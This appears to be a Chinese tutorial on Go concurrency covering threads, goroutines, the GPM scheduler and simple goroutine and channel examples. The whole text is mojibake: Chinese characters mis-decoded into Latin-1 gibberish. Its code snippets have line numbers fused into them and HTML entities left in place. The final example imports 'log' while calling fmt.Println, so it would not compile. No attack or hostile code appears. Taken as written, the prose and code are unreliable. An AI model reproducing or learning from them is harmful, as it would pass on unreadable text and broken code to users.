è¿™ç§å°†ç¨‹åºåˆ†æˆå¤šä¸ªå¯ç‹¬ç«‹æ‰§è¡Œçš„éƒ¨åˆ†çš„ç»“æ„åŒ–ç¨‹åºçš„è®¾è®¡æ–¹æ³•ï¼Œå°±æ˜¯å¹¶å‘è®¾è®¡ã€‚é‡‡ç”¨äº†å¹¶å‘è®¾è®¡çš„åº”ç”¨ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯ä¸€ç»„ç‹¬ç«‹æ‰§è¡Œçš„æ¨¡å—çš„ç»„åˆã€‚ ä¸è¿‡ï¼Œè¿›ç¨‹å¹¶ä¸é€‚åˆç”¨äºæ‰¿è½½å¹¶å‘è®¾è®¡çš„åº”ç”¨çš„æ¨¡å—æ‰§è¡Œæµã€‚å› ä¸ºè¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿä¸­èµ„æºæ‹¥æœ‰çš„åŸºæœ¬å•ä½ï¼Œå®ƒä¸ä»…åŒ…å«åº”ç”¨çš„ä»£ç å’Œæ•°æ®ï¼Œè¿˜æœ‰ç³»ç»Ÿçº§çš„èµ„æºï¼Œæ¯”å¦‚æ–‡ä»¶æè¿°ç¬¦ã€å†…å­˜åœ°å€ç©ºé—´ç­‰ç­‰ã€‚è¿›ç¨‹çš„â€œåŒ…è¢±â€å¤ªé‡ï¼Œè¿™å¯¼è‡´å®ƒçš„åˆ›å»ºã€åˆ‡æ¢ä¸æ’¤é”€çš„ä»£ä»·éƒ½å¾ˆå¤§ã€‚ äºæ˜¯çº¿ç¨‹ä¾¿è¯ç”Ÿäº†ã€‚ çº¿ç¨‹å¯ä»¥æŠŠçº¿ç¨‹ç†è§£ä¸ºâ€œè½»é‡çº§è¿›ç¨‹â€ã€‚ å¼•å…¥çº¿ç¨‹ä¹‹åï¼Œçº¿ç¨‹å°±æˆäº†æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚ ä¸€ä¸ªè¿›ç¨‹è‡³å°‘ä¼šåŒ…å«ä¸€ä¸ªçº¿ç¨‹ï¼Œå¦‚æœä¸€ä¸ªè¿›ç¨‹åªåŒ…å«ä¸€ä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆå®ƒé‡Œé¢çš„æ‰€æœ‰ä»£ç éƒ½åªä¼šè¢«ä¸²è¡Œåœ°æ‰§è¡Œã€‚æ¯ä¸ªè¿›ç¨‹çš„ç¬¬ä¸€ä¸ªçº¿ç¨‹éƒ½ä¼šéšç€è¯¥è¿›ç¨‹çš„å¯åŠ¨è€Œè¢«åˆ›å»ºï¼Œå®ƒä»¬å¯ä»¥è¢«ç§°ä¸ºå…¶æ‰€å±è¿›ç¨‹çš„ä¸»çº¿ç¨‹ã€‚ å¦‚æœä¸€ä¸ªè¿›ç¨‹ä¸­åŒ…å«äº†å¤šä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆå…¶ä¸­çš„ä»£ç å°±å¯ä»¥è¢«å¹¶å‘åœ°æ‰§è¡Œã€‚é™¤äº†è¿›ç¨‹çš„ç¬¬ä¸€ä¸ªçº¿ç¨‹ä¹‹å¤–ï¼Œå…¶ä»–çš„çº¿ç¨‹éƒ½æ˜¯ç”±è¿›ç¨‹ä¸­å·²å­˜åœ¨çš„çº¿ç¨‹åˆ›å»ºå‡ºæ¥çš„ã€‚ åŒæ—¶éšç€å¤šæ ¸ CPU çš„æ™®åŠï¼Œè®©çœŸæ­£çš„å¹¶è¡Œæˆä¸ºäº†å¯èƒ½ï¼Œäºæ˜¯ä¸»æµçš„åº”ç”¨è®¾è®¡æ¨¡å‹å˜æˆäº†è¿™æ ·ï¼š å¯ä»¥çœ‹åˆ°ï¼ŒåŸºäºçº¿ç¨‹çš„åº”ç”¨é€šå¸¸é‡‡ç”¨çš„æ˜¯å•è¿›ç¨‹å¤šçº¿ç¨‹çš„æ¨¡å‹ï¼Œä¸€ä¸ªåº”ç”¨å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ï¼Œåº”ç”¨é€šè¿‡å¹¶å‘è®¾è®¡å°†è‡ªå·±åˆ’åˆ†ä¸ºå¤šä¸ªæ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—ç”±ä¸€ä¸ªçº¿ç¨‹ç‹¬ç«‹æ‰¿è½½æ‰§è¡Œã€‚å¤šä¸ªçº¿ç¨‹å…±äº«è¿™ä¸ªè¿›ç¨‹æ‰€æ‹¥æœ‰çš„èµ„æºï¼Œæ­¤æ—¶ï¼Œä½œä¸ºæ‰§è¡Œå•å…ƒè¢« CPU å¤„ç†å°±ç”±è¿›ç¨‹å˜æˆäº†çº¿ç¨‹ã€‚ çº¿ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ä¸æ’¤é”€çš„ä»£ä»·ç›¸å¯¹äºè¿›ç¨‹æ˜¯è¦å°å¾—å¤šã€‚å½“è¿™ä¸ªåº”ç”¨çš„å¤šä¸ªçº¿ç¨‹åŒæ—¶è¢«è°ƒåº¦åˆ°ä¸åŒçš„å¤„ç†å™¨æ ¸ä¸Šæ‰§è¡Œæ—¶ï¼Œå°±è¯´è¿™ä¸ªåº”ç”¨æ˜¯å¹¶è¡Œçš„ã€‚ è®²åˆ°è¿™é‡Œï¼Œå¯ä»¥å¯¹å¹¶å‘ä¸å¹¶è¡Œä¸¤ä¸ªæ¦‚å¿µåšä¸€äº›åŒºåˆ†äº†ã€‚å°±åƒ Go è¯­è¨€ä¹‹çˆ¶ Rob Pike æ›¾è¯´è¿‡é‚£æ ·ï¼šå¹¶å‘ä¸æ˜¯å¹¶è¡Œï¼Œå¹¶å‘å…³ä¹ç»“æ„ï¼Œå¹¶è¡Œå…³ä¹æ‰§è¡Œã€‚ goroutine åŸºæœ¬æ¦‚å¿µGo å¹¶æ²¡æœ‰ä½¿ç”¨æ“ä½œç³»ç»Ÿçº¿ç¨‹ä½œä¸ºæ‰¿è½½åˆ†è§£åçš„ä»£ç ç‰‡æ®µï¼ˆæ¨¡å—ï¼‰çš„åŸºæœ¬æ‰§è¡Œå•å…ƒï¼Œè€Œæ˜¯å®ç°äº†goroutine è¿™ä¸€ç”± Go è¿è¡Œæ—¶ï¼ˆruntimeï¼‰è´Ÿè´£è°ƒåº¦çš„ã€è½»é‡çš„ç”¨æˆ·çº§çº¿ç¨‹ï¼Œä¸ºå¹¶å‘ç¨‹åºè®¾è®¡æä¾›åŸç”Ÿæ”¯æŒã€‚ ç›¸æ¯”ä¼ ç»Ÿæ“ä½œç³»ç»Ÿçº¿ç¨‹æ¥è¯´ï¼Œgoroutine çš„ä¼˜åŠ¿ä¸»è¦æ˜¯ï¼š èµ„æºå ç”¨å°ï¼Œæ¯ä¸ª goroutine çš„åˆå§‹æ ˆå¤§å°ä»…ä¸º 2k ç”± Go è¿è¡Œæ—¶è€Œä¸æ˜¯æ“ä½œç³»ç»Ÿè°ƒåº¦ï¼Œgoroutine ä¸Šä¸‹æ–‡åˆ‡æ¢åœ¨ç”¨æˆ·å±‚å®Œæˆï¼Œå¼€é”€æ›´å° åœ¨è¯­è¨€å±‚é¢è€Œä¸æ˜¯é€šè¿‡æ ‡å‡†åº“æä¾›ï¼Œgoroutine ç”± go å…³é”®å­—åˆ›å»ºï¼Œä¸€é€€å‡ºå°±ä¼šè¢«å›æ”¶æˆ–è€…é”€æ¯ï¼Œå¼€å‘è€…æ— éœ€è¿‡å¤šå…³æ³¨ è¯­è¨€å†…ç½® channel ä½œä¸º goroutine é—´é€šä¿¡åŸè¯­ï¼Œä¸ºå¹¶å‘è®¾è®¡æä¾›äº†å¼ºå¤§æ”¯æŒ å’Œä¼ ç»Ÿç¼–ç¨‹è¯­è¨€ä¸åŒçš„æ˜¯ï¼ŒGo è¯­è¨€æ˜¯é¢å‘å¹¶å‘è€Œç”Ÿçš„ï¼Œæ‰€ä»¥ï¼Œåœ¨ç¨‹åºçš„ç»“æ„è®¾è®¡é˜¶æ®µï¼ŒGo çš„æƒ¯ä¾‹æ˜¯ä¼˜å…ˆè€ƒè™‘å¹¶å‘è®¾è®¡ã€‚è¿™æ ·åšçš„ç›®çš„æ›´å¤šæ˜¯è€ƒè™‘éšç€å¤–ç•Œç¯å¢ƒçš„å˜åŒ–ï¼Œé€šè¿‡å¹¶å‘è®¾è®¡çš„ Go åº”ç”¨å¯ä»¥æ›´å¥½åœ°ã€æ›´è‡ªç„¶åœ°é€‚åº”è§„æ¨¡åŒ–ã€‚ goroutine è°ƒåº¦å™¨æåˆ°â€œè°ƒåº¦â€ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯æ“ä½œç³»ç»Ÿå¯¹è¿›ç¨‹ã€çº¿ç¨‹çš„è°ƒåº¦ã€‚æ“ä½œç³»ç»Ÿè°ƒåº¦å™¨ä¼šå°†ç³»ç»Ÿä¸­çš„å¤šä¸ªçº¿ç¨‹æŒ‰ç…§ä¸€å®šç®—æ³•è°ƒåº¦åˆ°ç‰©ç† CPU ä¸Šå»è¿è¡Œã€‚ ä¼ ç»Ÿçš„ç¼–ç¨‹è¯­è¨€ï¼Œæ¯”å¦‚ Cã€C++ ç­‰çš„å¹¶å‘å®ç°ï¼Œå¤šæ˜¯åŸºäºçº¿ç¨‹æ¨¡å‹çš„ï¼Œä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºè´Ÿè´£åˆ›å»ºçº¿ç¨‹ï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£è°ƒåº¦çº¿ç¨‹ã€‚ ä½†æ˜¯è¿™ç§ä¼ ç»Ÿçš„å¹¶å‘æ–¹å¼ï¼Œæœ‰å¾ˆå¤šä¸è¶³ï¼Œä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼ŒGo è¯­è¨€ä¸­çš„å¹¶å‘å®ç°ï¼Œä½¿ç”¨äº† Goroutineï¼Œä»£æ›¿äº†æ“ä½œç³»ç»Ÿçš„çº¿ç¨‹ï¼Œä¹Ÿä¸å†ä¾é æ“ä½œç³»ç»Ÿè°ƒåº¦ã€‚ Goroutine è°ƒåº¦çš„åˆ‡æ¢ä¸ç”¨é™·å…¥æ“ä½œç³»ç»Ÿçš„å†…æ ¸å±‚å®Œæˆï¼Œå¼€é”€å¾ˆä½ï¼Œå› æ­¤ä¸€ä¸ª Go ç¨‹åºå¯ä»¥åˆ›å»ºæˆåƒä¸Šä¸‡ä¸ªå¹¶å‘çš„ Goroutineã€‚è€Œå°†è¿™äº› Goroutine æŒ‰ç…§ä¸€å®šç®—æ³•æ”¾åˆ° â€œCPUâ€ ä¸Šæ‰§è¡Œçš„ç¨‹åºï¼Œåˆ™è¢«æˆä¸º Goroutine è°ƒåº¦å™¨ï¼Œæ³¨æ„ï¼Œè¿™é‡Œçš„â€œCPUâ€ æ˜¯æ‰“å¼•å·çš„ï¼Œå¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ CPUã€‚ ä¸€ä¸ª Go ç¨‹åºå¯¹äºæ“ä½œç³»ç»Ÿæ¥è¯´åªæ˜¯ä¸€ä¸ªç”¨æˆ·å±‚ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿçœ¼ä¸­åªæœ‰çº¿ç¨‹ï¼Œå®ƒç”šè‡³ä¸çŸ¥é“æœ‰ Goroutine çš„å­˜åœ¨ã€‚æ‰€ä»¥ Goroutine çš„è°ƒåº¦å…¨è¦é  Go è‡ªå·±å®Œæˆã€‚é‚£ä¹ˆï¼Œå®ç° Go ç¨‹åºå†… Goroutine ä¹‹é—´â€œå…¬å¹³â€ç«äº‰â€œCPUâ€èµ„æºçš„ä»»åŠ¡ï¼Œå°±è½åˆ°äº† Go è¿è¡Œæ—¶ï¼ˆruntimeï¼‰å¤´ä¸Šäº†ã€‚è¦çŸ¥é“åœ¨ä¸€ä¸ª Go ç¨‹åºä¸­ï¼Œé™¤äº†ç”¨æˆ·å±‚ä»£ç ï¼Œå‰©ä¸‹çš„å°±æ˜¯ Go è¿è¡Œæ—¶äº†ã€‚ äºæ˜¯ï¼ŒGoroutine çš„è°ƒåº¦é—®é¢˜å°±æ¼”å˜ä¸ºï¼ŒGo è¿è¡Œæ—¶å¦‚ä½•å°†ç¨‹åºå†…çš„ä¼—å¤š Goroutineï¼ŒæŒ‰ç…§ä¸€å®šç®—æ³•è°ƒåº¦åˆ°â€œCPUâ€èµ„æºä¸Šè¿è¡Œçš„é—®é¢˜äº†ã€‚ åœ¨æ“ä½œç³»ç»Ÿå±‚é¢ï¼Œçº¿ç¨‹ç«äº‰çš„â€œCPUâ€èµ„æºæ˜¯çœŸå®çš„ç‰©ç† CPUï¼Œè€Œ Go ç¨‹åºå±‚é¢ï¼Œå„ä¸ª Goroutine è¦ç«äº‰çš„â€œCPUâ€ èµ„æºåˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ å‰é¢è¯´è¿‡ï¼ŒGo ç¨‹åºæ˜¯ç”¨æˆ·å±‚ç¨‹åºï¼Œå®ƒæœ¬èº«å°±æ˜¯æ•´ä½“è¿è¡Œåœ¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ“ä½œç³»ç»Ÿçº¿ç¨‹ä¸Šçš„ã€‚æ‰€ä»¥ï¼ŒGoroutine è¦ç«äº‰çš„â€œCPUâ€ èµ„æºå…¶å®å°±æ˜¯æ“ä½œç³»ç»Ÿçº¿ç¨‹ã€‚å› æ­¤ï¼ŒGoroutine è°ƒåº¦å™¨çš„ä»»åŠ¡ä¹Ÿå°±æ˜ç¡®äº†ï¼Œå°† Goroutine æŒ‰ç…§ä¸€å®šç®—æ³•æ”¾åˆ°ä¸åŒçš„æ“ä½œç³»ç»Ÿçº¿ç¨‹ä¸­å»æ‰§è¡Œã€‚ GPM æ¨¡å‹Goroutine è°ƒåº¦å™¨ç›®å‰ä½¿ç”¨çš„æ˜¯ GPM æ¨¡å‹ï¼Œå®ƒç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š Gï¼ˆgoroutineï¼‰ï¼šGoroutineï¼Œå­˜å‚¨äº† Goroutine çš„æ‰§è¡Œæ ˆä¿¡æ¯ã€Goroutine çŠ¶æ€ä»¥åŠ Goroutine çš„ä»»åŠ¡å‡½æ•°ç­‰ Pï¼ˆprocessorï¼‰ï¼šé€»è¾‘å¤„ç†å™¨ï¼Œè´Ÿè´£ä»å…¨å±€è¿è¡Œå¯¹åˆ—ä¸­è·å– Gï¼ˆGoroutineï¼‰ï¼Œæ”¾åˆ°å¯¹åº”çš„æœ¬åœ°è¿è¡Œé˜Ÿåˆ—ï¼Œä¼šç»‘å®šå”¯ä¸€çš„æ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼Œå½“ G å¯ä»¥è¿è¡Œæ—¶ï¼Œä¼šè¢«æ”¾å…¥é€»è¾‘å¤„ç†å™¨çš„æ‰§è¡Œé˜Ÿåˆ— Mï¼ˆmachineï¼‰ï¼šç‰©ç†å¤„ç†å™¨ï¼ŒçœŸæ­£çš„æ‰§è¡Œè®¡ç®—èµ„æº æ“ä½œç³»ç»Ÿä¼šåœ¨ç‰©ç†å¤„ç†å™¨ä¸Šè°ƒåº¦çº¿ç¨‹æ¥è¿è¡Œï¼Œè€Œ Go è¯­è¨€çš„è¿è¡Œæ—¶ä¼šåœ¨é€»è¾‘å¤„ç†å™¨ä¸Šè°ƒåº¦ Goroutine æ¥è¿è¡Œã€‚ Gã€Pã€M ä¸‰è€…çš„è°ƒåº¦è¿‡ç¨‹å¦‚ä¸‹ï¼š åˆ›å»ºä¸€ä¸ª Goroutine å¹¶å‡†å¤‡è¿è¡Œï¼Œè¿™ä¸ª Goroutine å°±ä¼šè¢«æ”¾åˆ°è°ƒåº¦å™¨çš„å…¨å±€è¿è¡Œé˜Ÿåˆ—ä¸­ã€‚ å…¨å±€è¿è¡Œé˜Ÿåˆ—ä¸­çš„ Goroutine ä¾æ¬¡å‡ºé˜Ÿï¼Œè¢«è°ƒåº¦å™¨åˆ†é…ç»™é˜Ÿåˆ—çš„é€»è¾‘å¤„ç†å™¨ Pï¼Œå¹¶æ”¾åˆ°è¿™ä¸ªé€»è¾‘å¤„ç†å™¨çš„æœ¬åœ°è¿è¡Œé˜Ÿåˆ—ä¸­ï¼Œæœ¬åœ°è¿è¡Œé˜Ÿåˆ—ä¸­çš„ Goroutine ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°è‡ªå·±è¢«åˆ†é…çš„é€»è¾‘å¤„ç†å™¨æ‰§è¡Œã€‚ Goè¯­è¨€è¿è¡Œæ—¶é»˜è®¤ä¼šä¸ºæ¯ä¸ªå¯ç”¨çš„ç‰©ç†å¤„ç†å™¨åˆ†é…ä¸€ä¸ªé€»è¾‘å¤„ç†å™¨ï¼Œç‰©ç†å¤„ç†å™¨è°ƒåº¦çº¿ç¨‹å¼€å§‹æ‰§è¡Œ Goroutineã€‚ å¦‚æœæ­£åœ¨è¿è¡Œçš„ Goroutine éœ€è¦æ‰§è¡Œä¸€ä¸ªé˜»å¡çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ¯”å¦‚æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“è¿™ç±»è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œçº¿ç¨‹å’Œ Goroutine ä¼šä»é€»è¾‘å¤„ç†å™¨ä¸Šåˆ†ç¦»ï¼Œè¯¥çº¿ç¨‹ä¼šç»§ç»­é˜»å¡ï¼Œç­‰å¾…ç³»ç»Ÿè°ƒç”¨è¿”å›ã€‚ ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸ªé€»è¾‘å¤„ç†å™¨å°±å¤±å»äº†ç”¨æ¥è¿è¡Œçš„çº¿ç¨‹ã€‚æ‰€ä»¥ï¼Œè°ƒåº¦å™¨ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œå¹¶å°†å…¶ç»‘å®šåˆ°è¯¥é€»è¾‘å¤„ç†å™¨ä¸Šã€‚ ä¹‹åï¼Œè°ƒåº¦å™¨ä¼šä»æœ¬åœ°è¿è¡Œé˜Ÿåˆ—é‡Œé€‰æ‹©å¦å¤–ä¸€ä¸ª Goroutine æ¥è¿è¡Œï¼Œä¸€æ—¦è¢«é˜»å¡çš„ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œå®Œæˆå¹¶è¿”å›ï¼Œå¯¹åº”çš„ Goroutine ä¼šæ”¾å›åˆ°æœ¬åœ°è¿è¡Œé˜Ÿåˆ—ï¼Œè€Œä¹‹å‰çš„çº¿ç¨‹ä¼šä¿å­˜å¥½ï¼Œä»¥ä¾¿ä¹‹åç»§ç»­ä½¿ç”¨ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªGoroutine è°ƒåº¦åŸç†å›¾ï¼Œå¯ä»¥ä»å…¨å±€è¿›ä¸€æ­¥çœ‹åˆ° Gã€Pã€M ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼š goroutine çš„åŸºæœ¬ç”¨æ³•Go è¯­è¨€é€šè¿‡ go å…³é”®å­— + å‡½æ•°/æ–¹æ³•çš„æ–¹å¼â€œåˆ›å»ºâ€ä¸€ä¸ª goroutineã€‚ 1234567891011package mainimport \"fmt\"func main() &#123; for i := 0; i &lt; 10; i++ &#123; go func() &#123; fmt.Println(i) &#125;() &#125;&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œå¯èƒ½ä¼šå‘ç°ï¼Œä»€ä¹ˆéƒ½æ‰“å°å‡ºæ¥ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿ ä¸ä¸€ä¸ªè¿›ç¨‹æ€»ä¼šæœ‰ä¸€ä¸ªä¸»çº¿ç¨‹ç±»ä¼¼ï¼Œæ¯ä¸€ä¸ªç‹¬ç«‹çš„ Go ç¨‹åºåœ¨è¿è¡Œæ—¶ä¹Ÿæ€»ä¼šæœ‰ä¸€ä¸ªä¸» goroutineï¼ˆmain goroutineï¼‰ã€‚è¿™ä¸ªmain goroutine ä¼šåœ¨ Go ç¨‹åºçš„è¿è¡Œå‡†å¤‡å·¥ä½œå®Œæˆåè¢«è‡ªåŠ¨åœ°å¯ç”¨ï¼Œå¹¶ä¸éœ€è¦åšä»»ä½•æ‰‹åŠ¨çš„æ“ä½œã€‚ æ¯ä¸ª goroutine ä¸€èˆ¬éƒ½ä¼šæºå¸¦ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œè¿™ä¸ªè¢«è°ƒç”¨çš„å‡½æ•°å¸¸å¸¸è¢«ç§°ä¸ºgo å‡½æ•°ã€‚è€Œmain goroutine çš„goå‡½æ•°å°±æ˜¯é‚£ä¸ªä½œä¸ºç¨‹åºå…¥å£çš„ main å‡½æ•°ã€‚ è¿™é‡Œä¸€å®šè¦æ³¨æ„ï¼šgo å‡½æ•°çœŸæ­£è¢«æ‰§è¡Œçš„æ—¶é—´ï¼Œæ€»ä¼šä¸å…¶æ‰€å±çš„ go è¯­å¥è¢«æ‰§è¡Œçš„æ—¶é—´ä¸åŒã€‚ å½“ç¨‹åºæ‰§è¡Œåˆ°ä¸€æ¡ go è¯­å¥æ—¶ï¼ŒGo è¯­è¨€è¿è¡Œæ—¶ï¼Œä¼šå…ˆè¯•å›¾ä»æŸä¸ªç©ºé—²çš„ G çš„é˜Ÿåˆ—ä¸­è·å–ä¸€ä¸ª Gï¼ˆä¹Ÿå°±æ˜¯ goroutineï¼‰ï¼Œå®ƒåªæœ‰åœ¨æ‰¾ä¸åˆ°ç©ºé—² G çš„æƒ…å†µä¸‹æ‰ä¼šå»åˆ›å»ºä¸€ä¸ªæ–°çš„ Gã€‚ è¿™ä¹Ÿæ˜¯å‰é¢çš„â€œåˆ›å»ºâ€æ‰“å¼•å·çš„åŸå› ï¼Œå› ä¸ºå·²å­˜åœ¨çš„ goroutine æ€»æ˜¯ä¼šè¢«ä¼˜å…ˆå¤ç”¨ã€‚ åœ¨æ‹¿åˆ°ä¸€ä¸ªç©ºé—²çš„ G ä¹‹åï¼ŒGo è¯­è¨€è¿è¡Œæ—¶ï¼Œä¼šç”¨è¿™ä¸ª G å»åŒ…è£…å½“å‰çš„é‚£ä¸ª go å‡½æ•°ï¼ˆæˆ–è€…è¯´è¯¥å‡½æ•°ä¸­çš„é‚£äº›ä»£ç ï¼‰ï¼Œç„¶åå†æŠŠè¿™ä¸ª G è¿½åŠ åˆ°æŸä¸ªå­˜æ”¾å¯è¿è¡Œçš„ G çš„é˜Ÿåˆ—ä¸­ã€‚ è¿™ç±»é˜Ÿåˆ—ä¸­çš„ G æ€»æ˜¯æŒ‰ç…§å…ˆå…¥å…ˆå‡ºçš„é¡ºåºï¼Œè¢« Groutine è°ƒåº¦å™¨å®‰æ’è¿è¡Œã€‚ å› æ­¤ï¼Œgo å‡½æ•°çš„æ‰§è¡Œæ—¶é—´æ€»æ˜¯ä¼šæ˜æ˜¾æ»åäºå®ƒæ‰€å±çš„go è¯­å¥çš„æ‰§è¡Œæ—¶é—´ã€‚è¿™é‡Œæ‰€è¯´çš„â€œæ˜æ˜¾æ»åâ€æ˜¯å¯¹äºè®¡ç®—æœºçš„ CPU æ—¶é’Ÿå’Œ Go ç¨‹åºæ¥è¯´çš„ã€‚æˆ‘ä»¬åœ¨å¤§å¤šæ•°æ—¶å€™éƒ½ä¸ä¼šæœ‰æ˜æ˜¾çš„æ„Ÿè§‰ã€‚ è¿˜æœ‰ä¸€ä¸ªä¸ main goroutine æœ‰å…³çš„ç‰¹æ€§ï¼Œä¸€æ—¦main goroutine é€€å‡ºäº†ï¼Œé‚£ä¹ˆä¹Ÿæ„å‘³ç€æ•´ä¸ªåº”ç”¨ç¨‹åºçš„é€€å‡ºã€‚ å†æ¬¡å›åˆ°ä¸Šé¢ç¤ºä¾‹ä»£ç æ²¡æœ‰æ‰“å°å‡ºç»“æœçš„è¿™ä¸ªé—®é¢˜ï¼Œè¿™æ˜¯å› ä¸ºå…³é”®å­— go å¹¶éç›´æ¥æ‰§è¡Œå¹¶å‘æ“ä½œï¼Œè€Œæ˜¯â€œåˆ›å»ºâ€ä¸€ä¸ª goroutineï¼ˆå¹¶å‘ä»»åŠ¡å•å…ƒï¼‰ã€‚æ–°åˆ›å»ºçš„ goroutine è¢«æ”¾ç½®åœ¨é˜Ÿåˆ—ä¸­ï¼Œç­‰å¾…è°ƒåº¦å™¨å®‰æ’åˆé€‚ç³»ç»Ÿçº¿ç¨‹å»è·å–æ‰§è¡Œæƒã€‚è¯¥è¿‡ç¨‹ä¸ä¼šé˜»å¡ï¼Œå› æ­¤ä¸ä¼šç­‰å¾…è¯¥ä»»åŠ¡å¯åŠ¨ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œåè¾¹çš„è¯­å¥ï¼Œå¦‚æœç›´è‡³ main goroutine é€€å‡ºæ—¶ï¼Œè¿˜æœ‰ goroutine æœªå¾—åˆ°æ‰§è¡Œï¼Œé‚£ä¹ˆå®ƒä»¬ä¸­çš„ä»£ç ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œäº†ï¼Œå› ä¸ºæ•´ä¸ªç¨‹åºä¹Ÿè¦é€€å‡ºäº†ï¼Œ æ‰€ä»¥æ²¡æœ‰ä»»ä½•å†…å®¹æ‰“å°å‡ºæ¥ã€‚ Go è¯­è¨€å¹¶ä¸ä¼šä¿è¯ goroutine ä¼šä»¥æ€æ ·çš„é¡ºåºè¿è¡Œï¼Œç”±äºmain goroutine ä¼šä¸æ‰‹åŠ¨ä½¿ç”¨ go å…³é”®å­—åˆ›å»ºçš„ goroutine ä¸€èµ·æ¥å—è°ƒåº¦ï¼Œè°ƒåº¦å™¨å¯èƒ½ä¼šåœ¨ goroutine ä¸­ä»£ç æ‰§è¡Œä¸€éƒ¨åˆ†æ—¶æš‚åœï¼Œå› æ­¤ï¼Œå“ªä¸ª gorotuine å…ˆæ‰§è¡Œå®Œï¼Œå“ªä¸ªåæ‰§è¡Œå®Œï¼Œå¾€å¾€æ˜¯ä¸å¯é¢„çŸ¥çš„ã€‚é™¤éä½¿ç”¨Go è¯­è¨€æä¾›çš„æ–¹å¼è¿›è¡Œäººä¸ºå¹²é¢„ã€‚ ä¸‹é¢ä¼šç®€å•ä»‹ç»ä¸€ä¸‹ã€‚ goroutine æ‰§è¡Œè§„åˆ™å› ä¸ºä¸€æ—¦ main goroutine æ‰§è¡Œå®Œæˆï¼Œå½“å‰ Go ç¨‹åºå°±ä¼šç»“æŸè¿è¡Œï¼Œæ— è®ºå…¶ä»–çš„ goroutine æ˜¯å¦å·²ç»åœ¨è¿è¡Œä¸­ï¼Œé‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥è®©å…¶ä»–çš„ goroutine å…ˆæ‰§è¡Œå®Œæˆä¹‹åï¼Œå†è®©main goroutine æ‰§è¡Œå‘¢ï¼Ÿ æœ‰å¾ˆå¤šåŠæ³•å¯ä»¥åšåˆ°ï¼Œè¿™é‡Œå…ˆç”¨æœ€ç®€å•ç²—æš´çš„æ–¹å¼æ„Ÿå—ä¸€ä¸‹ï¼š 12345678func main() &#123; for i := 0; i &lt; 10; i++ &#123; go func() &#123; fmt.Println(i) &#125;() &#125; time.Sleep(500 * time.Millisecond)&#125; è¿è¡Œç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºä¸€ä¸‹ç»“æœï¼š 123456789101110101010107101087// å»¶è¿Ÿ 500 ms ç»“æŸç¨‹åº å…¶åŸç†å°±æ˜¯åœ¨ for è¯­å¥çš„åé¢ï¼Œè°ƒç”¨ time.Sleep å‡½æ•°ï¼Œè®© main goroutine å»¶è¿Ÿ 500ms ç»“æŸã€‚ è¿™é‡Œå»¶è¿Ÿ 500msï¼Œè¶³å¤Ÿå…¶ä»–çš„ goroutine è¢«è°ƒåº¦å™¨è°ƒåº¦äº†ï¼Œå› æ­¤ä¾¿å¯ä»¥çœ‹åˆ°æ‰“å°ç»“æœã€‚ è¿™ä¸ªåŠæ³•è™½ç„¶å¯è¡Œï¼Œä½†æ˜¯ Sleep çš„æ—¶é—´è®¾ç½®å¤šä¹…æ‰åˆé€‚å‘¢ï¼Ÿ500msã€200msã€100msï¼Ÿè®¾ç½®å¤ªçŸ­äº†ï¼Œå¯èƒ½è¿˜æ²¡æœ‰æ‰“å°å°±ç»“æŸäº†ï¼Œè®¾ç½®å¤ªé•¿äº†ï¼Œå®Œå…¨åˆæµªè´¹æ—¶é—´ã€‚ æ—¢ç„¶ä¸å¥½é¢„ä¼°æ—¶é—´ï¼Œé‚£ä¹ˆèƒ½å¦è®©å…¶ä»–çš„ goroutine åœ¨è¿è¡Œå®Œæˆæ—¶é€šçŸ¥ä¸€ä¸‹å‘¢ï¼Ÿ è¿™ä¸ªæ€è·¯æ˜¯å¯¹çš„ï¼Œä½¿ç”¨Go çš„ channel å°±å¯ä»¥å®ç°ï¼ˆåé¢çš„ç¬”è®°ä¼šè¯¦ç»†ä»‹ç» channelï¼‰ï¼Œè¿™é‡Œæœ‰ä¸ªå°è±¡å°±å¥½ã€‚ 12345678910111213141516171819package mainimport \"log\"func main() &#123; sign := make(chan int) for i := 0; i &lt; 10; i++ &#123; go func(i int) &#123; // å°†å˜é‡ i ä¾æ¬¡å‘é€åˆ° channel ç±»å‹å˜é‡ä¸­ sign &lt;- i &#125;(i) &#125; for j := 0; j &lt; 10; j++ &#123; // ä¾æ¬¡ä»channel ç±»å‹å˜é‡ä¸­å–å‡ºå€¼å¹¶æ‰“å° fmt.Println(&lt;-sign) &#125;&#125; è¿è¡Œç¤ºä¾‹ä»£ç 